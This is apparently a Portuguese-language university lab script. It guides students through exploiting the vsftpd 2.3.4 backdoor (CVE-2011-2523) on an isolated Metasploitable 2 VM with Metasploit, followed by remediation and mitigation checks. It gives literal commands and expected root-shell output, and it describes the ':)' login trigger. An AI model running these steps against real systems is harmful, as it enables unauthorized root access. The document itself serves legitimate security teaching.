# Prática 2 — Roteiro do Metasploit (COMANDOS LITERAIS — digite exatamente isto)

> **Regra absoluta:** apenas contra a VM **Metasploitable 2** (deliberadamente vulnerável), em rede **isolada**, com **autorização**. Nunca contra o Windows real do laboratório ou qualquer sistema de uso cotidiano. Sem persistência, evasão de AV, roubo de credenciais, ransomware ou acesso a terceiros.

## Cenário padrão deste laboratório (já usado em todo o material)

| Item | Valor |
|---|---|
| Alvo | Metasploitable 2 |
| IP do alvo | `192.168.56.40` (faixa host-only isolada; **confirme com o reconhecimento**) |
| Serviço vulnerável | FTP **vsftpd 2.3.4** na porta 21 |
| Falha | Backdoor do vsftpd 2.3.4 — **CVE-2011-2523** |
| Módulo Metasploit | `exploit/unix/ftp/vsftpd_234_backdoor` |
| Estação atacante (Kali) | ex.: `192.168.56.20` |

> **Atenção:** se o IP do seu alvo for diferente, **troque `192.168.56.40` pelos valores reais do seu laboratório** nos comandos abaixo. O restante da sequência é idêntico.

---

## Etapa 1 — Confirmar alvo e autorização (no Kali)

```bash
ping -c 3 192.168.56.40
```

*Esperado:* 3 respostas do alvo. Diga em voz alta e registre na folha: "alvo de laboratório, isolado, autorizado".

## Etapa 2 — Identificar serviços (no Kali)

```bash
./reconhecimento.sh 192.168.56.40
```

*Esperado:* na saída do nmap, a linha:
```
21/tcp   open  ftp    vsftpd 2.3.4
```
Anote: serviço **ftp**, versão **vsftpd 2.3.4**.

## Etapa 3 — Reconhecer a vulnerabilidade (discussão com a turma)

Pela versão detectada: o vsftpd 2.3.4 possui uma **porta dos fundos** (backdoor) documentada (CVE-2011-2523): uma sequência malformada de login (`USER terminando em ":)"`) abre uma shell como **root** na porta 6200. Efeito: **execução remota de código (RCE)** com privilégio máximo. Pré-condição: serviço exposto na 21 e versão exatamente 2.3.4.

## Etapa 4 — Abrir o Metasploit e inspecionar o módulo

```bash
msfconsole -q
```

Dentro do console, **digite nesta ordem**:

```
search vsftpd
```

*Esperado (algo como):*
```
#  Name                                  Disclosure Date  Rank       Check  Description
0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  Yes    VSFTPD v2.3.4 Backdoor Command Execution
```

```
info exploit/unix/ftp/vsftpd_234_backdoor
```

*Leia com a turma:* descrição da falha, **Rank: excellent**, **Check supported: yes** (permite validar sem explorar), plataforma unix.

```
use exploit/unix/ftp/vsftpd_234_backdoor
```

*Esperado:* o prompt muda para `msf6 exploit(unix/ftp/vsftpd_234_backdoor) >`.

```
show options
```

*Esperado:*
```
Name     Current Setting  Required  Description
----     ---------------  --------  -----------
RHOSTS                    yes       The target host(s)
RPORT    21               yes       The target port (TCP)
```
Interpretação: só falta definir o alvo (`RHOSTS` está vazio e é obrigatório); `RPORT` já vem 21, que é o valor correto — **não precisa mudar**.

## Etapa 5 — Validar compatibilidade (módulo × serviço × alvo)

A descrição do `info` diz que o módulo atinge **vsftpd 2.3.4** — a versão que o `nmap -sV` mostrou na Etapa 2. **Bateu → siga. Não bate (versão diferente) → NÃO force;** use o plano alternativo no fim deste arquivo.

## Etapa 6 — Checar sem explorar, e executar a validação controlada

Ainda dentro do msfconsole:

```
set RHOSTS 192.168.56.40
```

```
check
```

*Esperado:* `[+] 192.168.56.40:21 - The target is vulnerable.`
(Se vier "unlikely", timeout ou "connection refused": confira IP, cabo/rede e se o alvo está ligado — **não prossiga até entender o porquê**.)

```
run
```

*Esperado (algo como):*
```
[*] 192.168.56.40:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.56.40:21 - USER: 331 Please specify the password.
[+] 192.168.56.40:21 - Backdoor service has been spawned, handling...
[+] 192.168.56.40:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.56.20:44321 -> 192.168.56.40:6200)
```

## Etapa 7 — Registrar a evidência (prova de execução remota)

Este módulo abre uma **shell de comandos simples** — `sysinfo` e `getuid` **não existem** aqui (são de Meterpreter). Na sessão aberta, digite:

```
id
```

*Esperado:* `uid=0(root) gid=0(root)` → prova de execução remota **como root no alvo**.

```
hostname
```

*Esperado:* `metasploitable` → prova de que o comando rodou **no ALVO**, não na estação Kali.

**Capture a tela** (ou copie essas linhas) — essa é a evidência a entregar.

## Etapa 8 — Encerrar e restaurar

```
exit
```

(sai da shell do alvo, volta ao console)

```
sessions -K
```

(encerra todas as sessões)

```
exit
```

(fecha o msfconsole)

No host da VM: **restaure o snapshot limpo** do Metasploitable (VMware/VirtualBox → snapshot → revert).

## Etapa 9 — Correção e validação da mitigação (a parte mais importante)

Explique a correção real:
- **Atualizar/remover** o serviço vulnerável (vsftpd 2.3.4 sai; versão corrigida entra — ou o FTP é desativado se não for usado).
- **Reduzir superfície:** desligar os demais serviços abertos que o `nmap` mostrou e não são necessários.
- **Mínimo privilégio:** um serviço FTP não deveria, em caso algum, entregar shell de root.
- **Segmentação:** o alvo não deve ser alcançável a partir de redes não confiáveis.

**Validar a mitigação:** repita `nmap -sV 192.168.56.40` → a porta 21 deve sumir ou mudar de versão; refaça o `check` no msfconsole → deve reportar "not vulnerable" / falhar.

---

## Plano alternativo (sem alvo vulnerável, módulo incompatível, ou Metasploit não inicia)

Troque a exploração por **reconhecimento + análise**, que avalia o mesmo raciocínio:

```bash
# 1) Reconhecimento de um servico local SEGURO (ex.: o servidor da Pratica 1)
nmap -sV 192.168.56.10

# 2) Metasploit em MODO ANALISE (ler, sem executar 'run'):
msfconsole -q
#   search vsftpd
#   info exploit/unix/ftp/vsftpd_234_backdoor
#   show options
```

E use a evidência pré-preparada do desafio (`../desafio-final/recon_services.txt`, `../desafio-final/host_events.log`) para discutir: *se* houvesse exploração, que **sinal** apareceria no host? (Resposta no gabarito: processo filho inesperado + conexão de saída/beacon.)

### Diagnóstico rápido se o Metasploit não iniciar

```bash
msfconsole --version          # a ferramenta responde?
sudo msfdb status             # estado do banco de dados
sudo msfdb init               # inicializa o banco, se necessario
```

Se não resolver em poucos minutos: use os prints/capturas de referência e siga em modo análise. **A aula não depende da exploração ao vivo.**
